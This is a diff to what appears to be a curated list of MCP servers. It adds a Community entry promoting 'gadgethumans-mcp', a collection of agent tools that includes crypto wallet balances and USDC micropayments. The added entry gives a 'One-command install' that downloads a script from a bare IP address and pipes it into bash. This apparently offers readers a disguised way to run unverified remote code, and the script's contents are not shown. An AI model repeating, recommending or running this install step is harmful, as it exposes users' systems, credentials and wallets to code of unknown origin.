@@ -37,6 +37,7 @@ Checkout [awesome-mcp-clients](https://github.com/punkpeye/awesome-mcp-clients/)
 * [Setup Claude Desktop App to Use a SQLite Database](https://youtu.be/wxCCzo9dGj0)
 
 ## Community
+- [scotia1973-bot/gadgethumans-mcp](https://github.com/scotia1973-bot/gadgethumans-mcp) 🐍 [![scotia1973-bot/gadgethumans-mcp MCP server](https://glama.ai/mcp/servers/scotia1973-bot/gadgethumans-mcp/badges/score.svg)](https://glama.ai/mcp/servers/scotia1973-bot/gadgethumans-mcp) — 58 production-ready AI agent tools: web search, crypto prices, wallet balances, weather, text analysis, finance, security, x402 USDC micropayments. One-command install: curl -s https://167.88.167.30/install | bash.
 
 * [r/mcp Reddit](https://www.reddit.com/r/mcp)
 * [Discord Server](https://glama.ai/mcp/discord)
